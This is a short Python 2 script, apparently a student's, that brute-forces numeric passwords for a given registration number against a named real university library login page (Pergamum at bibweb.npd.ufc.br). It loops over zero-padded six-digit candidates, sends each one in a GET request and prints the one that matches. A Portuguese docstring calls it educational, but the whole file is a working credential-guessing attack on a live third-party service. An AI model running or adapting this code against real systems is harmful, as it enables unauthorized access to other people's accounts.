# -*- coding: cp1252 -*-
import urllib2
__author__      = "Davi Wesley"
__email__ = "davi.wesley@icloud.com"
'''
Esse programa foi feito para fins educativos
'''
inscricao = int(input("Digite sua incrição: "))
a = int(input("Digite o inicio do intervalo: "))
b = int(input("Digite o final do intervalo: "))

for i in range(a, b + 1):
    # sequencia para '0000##'
    if (a < 9) and (b >= 9):
        z = '00000' + str(i)
        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao) + "&password=" + str(z) + "&button=Acessar&numero_mestre="
        webUrl = urllib2.urlopen(url)
        data = webUrl.read()
        if data == "Acesso não autorizado!":
            print "[!]SENHA ENCONTRADA= " + str(z)
            break
        else:
            print "[+]SENHA NAO ENCONTRADA " + str(z)
    # sequencia para '000###'
    if (a < 1000) and (b >= 100):
        z = '000' + str(i)
        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
        webUrl=urllib2.urlopen(url)
        data=webUrl.read()
        if data == "Acesso não autorizado!":
            print "[!]SENHA ENCONTRADA= " + str(z)
            break
        else:
            print "[+]SENHA NAO ENCONTRADA " + str(z)
    # sequencia para '00####'
    if (a < 10000) and (b >= 1000):
        z = '00' + str(i)
        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
        webUrl=urllib2.urlopen(url)
        data=webUrl.read()
        if data == "Acesso não autorizado!":
            print "[!]SENHA ENCONTRADA= " + str(z)
            break
        else:
            print "[+]SENHA NAO ENCONTRADA " + str(z)
    # sequencia para '0#####'
    if (a < 100000) and (b >= 10000):
        z = '0' + str(i)
        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
        webUrl=urllib2.urlopen(url)
        data=webUrl.read()
        if data == "Acesso não autorizado!":
            print "[!]SENHA ENCONTRADA= " + str(z)
            break
        else:
            print "[+]SENHA NAO ENCONTRADA " + str(z)
    # sequencia para '######' 6 digitos(full)
    if (a < 1000000) and (b >= 100000):
        z = str(i)
        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
        webUrl=urllib2.urlopen(url)
        data=webUrl.read()
        if data == "Acesso não autorizado!":
            print "[!]SENHA ENCONTRADA= " + str(z)
            break
        else:
            print "[+]SENHA NAO ENCONTRADA " + str(z)
